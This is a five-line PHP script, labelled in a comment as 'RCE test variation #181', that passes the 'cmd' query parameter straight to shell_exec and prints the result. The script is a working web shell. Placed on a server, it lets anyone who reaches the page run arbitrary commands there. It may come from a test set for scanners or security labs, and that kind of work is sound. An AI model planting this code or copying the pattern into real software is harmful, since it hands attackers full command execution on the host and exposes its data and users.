<?php
// RCE test variation #181
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>